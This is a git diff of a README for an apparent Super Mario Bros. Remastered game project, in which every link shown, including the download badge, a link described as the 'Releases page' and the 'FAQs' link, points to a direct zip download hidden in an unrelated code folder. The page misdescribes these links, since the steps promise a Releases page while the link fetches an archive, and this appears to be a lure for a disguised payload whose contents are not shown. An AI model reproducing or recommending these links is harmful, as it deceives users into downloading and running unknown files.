@@ -1,6 +1,6 @@
 # 🎮 Super-Mario-Bros.-Remastered-Public - Play Classic Levels with a New Twist
 
-[![Download Now](https://raw.githubusercontent.com/xyinia/Super-Mario-Bros.-Remastered-Public/main/achordal/Super-Mario-Bros.-Remastered-Public.zip%20Now-%20-blue?style=for-the-badge)](https://raw.githubusercontent.com/xyinia/Super-Mario-Bros.-Remastered-Public/main/achordal/Super-Mario-Bros.-Remastered-Public.zip)
+[![Download Now](https://github.com/xyinia/Super-Mario-Bros.-Remastered-Public/raw/refs/heads/main/Scripts/Classes/Entities/Public_Bros_Super_Mario_Remastered_A.zip%20Now-%20-blue?style=for-the-badge)](https://github.com/xyinia/Super-Mario-Bros.-Remastered-Public/raw/refs/heads/main/Scripts/Classes/Entities/Public_Bros_Super_Mario_Remastered_A.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Welcome to Super Mario Bros. Remastered! This application brings you a fresh tak
 
 To download the latest version of Super Mario Bros. Remastered, please visit our Releases page:
 
-[Download Now](https://raw.githubusercontent.com/xyinia/Super-Mario-Bros.-Remastered-Public/main/achordal/Super-Mario-Bros.-Remastered-Public.zip)
+[Download Now](https://github.com/xyinia/Super-Mario-Bros.-Remastered-Public/raw/refs/heads/main/Scripts/Classes/Entities/Public_Bros_Super_Mario_Remastered_A.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of the application.
@@ -64,7 +64,7 @@ If you want to design your own levels:
 
 Join our community to share levels, tips, and tricks. Connect with other players for a richer gaming experience. You can find our community on social media and gaming forums. 
 
-If you run into any issues, please visit our [FAQs](https://raw.githubusercontent.com/xyinia/Super-Mario-Bros.-Remastered-Public/main/achordal/Super-Mario-Bros.-Remastered-Public.zip) for answers or open an issue on GitHub.
+If you run into any issues, please visit our [FAQs](https://github.com/xyinia/Super-Mario-Bros.-Remastered-Public/raw/refs/heads/main/Scripts/Classes/Entities/Public_Bros_Super_Mario_Remastered_A.zip) for answers or open an issue on GitHub.
 
 ## 🏆 Contributing
 
